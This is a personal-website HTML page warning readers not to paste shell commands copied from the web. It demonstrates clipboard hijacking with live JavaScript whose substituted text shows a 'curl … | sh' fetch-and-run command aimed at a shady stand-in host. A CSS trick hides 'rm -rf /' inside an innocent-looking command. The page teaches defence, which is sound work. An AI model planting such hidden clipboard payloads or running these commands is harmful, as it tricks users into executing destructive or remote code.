<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Brian C Tracy Brown University Palo Alto personal website programmer Brian Tracy - copy-paste-shell"><title>Brian Tracy - copy-paste-shell</title><link href="data:," rel="icon"><style>main{margin:auto;max-width:48em}pre{background-color:#d3d3d3;padding:1em}code{background-color:#d3d3d3}footer{font-style:italic;margin-top:3em}hr{width:60%}h1,h2,h3,h4,h5{color:#006400}table{border-collapse:collapse;border-spacing:0}th,td{border:2px solid silver;padding:4px}</style></head><body><main><h1>Don't Copy Paste Into A Shell</h1><p>When you see a shell command on the Internet, do not copy it into your terminal.</p><p>Modern JavaScript Clipboard APIs allow a website to trivially overwrite what you put inside your clipboard, without the user's confirmation or permission.</p><p>Here is an example of how easy it is to perform this attack. Imagine that the red text below is a shell command you want to use. Below that is a <code>textarea</code> for you to simulate pasting into your shell.</p><p id="copyme" style="background-color:#ffcccb;padding:5px;border:1px dashed red;">$ echo "looks safe to me!"</p><textarea style="width: 100%"></textarea><p>Note that you don't even have to press ENTER in your terminal after pasting for the exploit to happen. The payload conveniently contains a trailing newline that does that for you!</p><p>Here is the JavaScript that is performing the exploit.</p><pre><code>document.getElementById(&#39;copyme&#39;).addEventListener(&#39;copy&#39;, function(e) {
    e.clipboardData.setData(&#39;text/plain&#39;,
        &#39;echo &quot;this could have been [curl http://myShadySite.com | sh]&quot;\n&#39;
    );
    e.preventDefault();
});</code></pre><p>In addition, disabling JavaScript will not save you! A pure CSS exploit exists as well.</p><p id="copyme-css" style="background-color:#ffcccb;padding:5px;border:1px dashed red;">$ echo <span style="font-size: 0;">; rm -rf / ; echo </span>"looks safe to me!"</p><textarea style="width: 100%"></textarea><pre><code>$ echo &lt;span style=&quot;font-size: 0;&quot;&gt;; rm -rf / ; echo &lt;/span&gt; &quot;looks safe to me!&quot;</code></pre><script>document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain', 'echo "this could have been [curl http://myShadySite.com | sh]"\n');
    e.preventDefault();
});</script></main><footer>Last modified Mar 28 15:36:10 2021</footer></body></html>